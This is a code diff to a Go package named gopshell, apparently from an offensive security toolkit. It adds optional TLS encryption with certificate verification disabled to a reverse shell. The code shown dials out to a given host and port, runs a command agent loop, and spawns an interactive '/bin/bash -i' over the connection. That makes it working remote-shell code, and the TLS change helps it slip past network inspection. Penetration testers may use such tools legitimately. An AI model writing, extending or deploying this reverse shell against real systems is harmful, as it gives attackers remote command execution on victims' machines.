@@ -1,6 +1,7 @@
 package gopshell
 
 import (
+	"crypto/tls"
 	"fmt"
 	"io"
 	"log"
@@ -12,15 +13,21 @@ import (
 	"github.com/hophouse/gop/utils/logger"
 )
 
+type ConnInterface interface {
+	Write(b []byte) (n int, err error)
+	Read(b []byte) (n int, err error)
+	Close() error
+}
+
 // Run a reverse of bind shell
-func RunShellCmd(mode string, host string, port string) {
+func RunShellCmd(mode string, host string, port string, ssltls bool) {
 	logger.Println("[+] Start the shell as mode :", mode)
 
 	switch mode {
 	case "bind":
 		bindShell(host, port)
 	case "reverse":
-		reverseShell(host, port)
+		reverseShell(host, port, ssltls)
 	default:
 		log.Fatal("Unknown mode")
 	}
@@ -46,12 +53,23 @@ func bindShell(host string, port string) {
 
 }
 
-func reverseShell(host string, port string) {
+func reverseShell(host string, port string, ssltls bool) {
 
 	address := fmt.Sprintf("%s:%s", host, port)
 	logger.Println("[+] Address ", address)
 
-	conn, err := net.Dial("tcp", address)
+	var conn ConnInterface
+	var err error
+
+	if ssltls {
+		config := &tls.Config{
+			InsecureSkipVerify: true,
+		}
+		conn, err = tls.Dial("tcp", address, config)
+	} else {
+
+		conn, err = net.Dial("tcp", address)
+	}
 	if err != nil {
 		log.Fatal("[!] Unable to dial the address")
 	}
@@ -60,7 +78,7 @@ func reverseShell(host string, port string) {
 	runAgent(conn)
 }
 
-func runAgent(conn net.Conn) {
+func runAgent(conn ConnInterface) {
 	for {
 		conn.Write([]byte("$> "))
 
@@ -93,7 +111,7 @@ func runAgent(conn net.Conn) {
 	}
 }
 
-func displayHelp(conn net.Conn) {
+func displayHelp(conn ConnInterface) {
 	conn.Write([]byte("[+] Help\n"))
 	conn.Write([]byte("\t- help\tDisplay this help\n"))
 	conn.Write([]byte("\t- shell\tRun a shell\n"))
@@ -101,7 +119,7 @@ func displayHelp(conn net.Conn) {
 	conn.Write([]byte("\t- exit\texit\n"))
 }
 
-func runCommand(conn net.Conn, input string) {
+func runCommand(conn ConnInterface, input string) {
 	var out []byte
 	var err error
 
@@ -117,7 +135,7 @@ func runCommand(conn net.Conn, input string) {
 	conn.Write([]byte(out))
 }
 
-func runShell(conn net.Conn) {
+func runShell(conn ConnInterface) {
 	r, w := io.Pipe()
 
 	cmd := exec.Command("/bin/bash", "-i")
